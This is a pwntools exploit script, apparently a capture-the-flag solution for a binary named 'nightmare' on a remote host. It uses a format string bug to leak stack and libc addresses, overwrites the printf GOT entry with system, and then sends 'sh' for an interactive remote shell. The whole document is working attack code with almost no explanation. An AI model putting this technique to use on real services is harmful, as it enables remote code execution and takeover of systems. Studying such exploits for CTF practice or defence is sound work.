#Format String
#https://www.youtube.com/watch?v=U42Yz97gmQc

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

def detect(io):
	io.sendlineafter('>', '1')
	io.sendlineafter('>>', '%p.'*80)
	buf = io.recvline().strip().split('.')
	for i in range(len(buf)):
		print str(i+1)+' : '+buf[i]
	
def detect2(io):
	for i in range(10):
		io.sendlineafter('> ', '2')
		io.sendlineafter('>> ', '%'+str(i+1)+'$p')
		buf = io.recvline().strip()
		print str(i+1)+' : '+buf
	for i in range(11, 32, 1):
		io.sendlineafter('> ', '22')
		io.sendlineafter('>> ', '%'+str(i+1)+'$p')
		buf = io.recvline().strip()
		print str(i+1)+' : '+buf

def detect3(io, i):
	io.sendlineafter('> ', '2')
	io.sendlineafter('>> ', '%'+str(i)+'$p')
	buf = io.recvline().strip()
	print str(i)+' : '+buf

binary = './nightmare'
elf = ELF(binary)

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#io = process(binary)
#io = gdb.debug(binary, '''
#breakrva 0x1478
#continue
#''')

libc = ELF('./libc6_2.31-0ubuntu9_amd64.so')
ip, port = '178.62.72.53', 30246
io = remote(ip, port)

def send_payload(payload):
	io.sendlineafter('>', 1)
	io.sendlineafter('>>', payload)
	return io.recvline().strip()

format_string = FmtStr(execute_fmt=send_payload, offset=5)

#output to stderr, cannot get from remote...
#detect(io)   #offset = 5

#detect2(io)  #offset of ret address = 9
#detect3(io, 10)
#detect3(io, 11)
#detect3(io, 12)
#detect3(io, 13)	#libc address, constant offset to system
#detect3(io, 14)
#detect3(io, 15)
#detect3(io, 16)

io.sendlineafter('>', '2')
io.sendlineafter('>>', '%9$p')
base = int(io.recvline(), 16) - 0x14d5
elf.address = base

print hex(elf.got.puts)

'''
libc puts addr - stack #13
>>> 0x7fa827e44ed0-0x7fa827dedd90
356672
>>> 0x7ff689595ed0-0x7ff68953ed90
356672
>>> hex(356672)
'0x57140'
'''

io.sendlineafter('>', '2')
io.sendlineafter('>>', '%13$p')
#gdb __libc_start_call_main+128 -> search __libc_start_main_ret?? why? in https://libc.blukat.me/
libc_addr = int(io.recvline(), 16)
libc_base = libc_addr - 0x0270b3

libc.address = libc_base

io.sendlineafter('>', '11')

'''
one_gadget libc6_2.31-0ubuntu9_amd64.so
0xe6aee execve("/bin/sh", r15, r12)
'''
#one gadget seems not work...
#one_gadget = libc_base + 0xe6aee
#payload = fmtstr_payload(5, {elf.got.printf : one_gadget})
#io.sendlineafter('>>', payload)

system_addr = libc_base + 0x055410
format_string.write(elf.got.printf, system_addr)
format_string.execute_writes()

io.sendline('2')  # This time we want to "enter code"
io.recv()
io.sendline('sh')  # Printf is now called (but actually system) so we pass 'sh'

io.interactive()
